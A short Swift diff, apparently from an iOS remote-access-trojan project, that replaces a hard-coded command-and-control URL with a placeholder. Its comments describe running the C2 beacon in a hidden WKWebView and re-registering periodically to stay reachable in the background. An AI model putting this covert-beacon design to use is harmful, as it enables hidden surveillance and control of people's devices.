@@ -3,7 +3,7 @@ import Foundation
 enum Cfg {
     // The C2 landing page that runs the main-thread agent. The native app
     // embeds this in a hidden WKWebView so the beacon runs out-of-process.
-    static let c2URL = "https://ios-rat-chain.maxvlogs75.workers.dev/"
+    static let c2URL = "your url"
 
     // Re-register with the C2 at least this often (seconds) so a background
     // refresh keeps the DO warm even if the app is suspended.
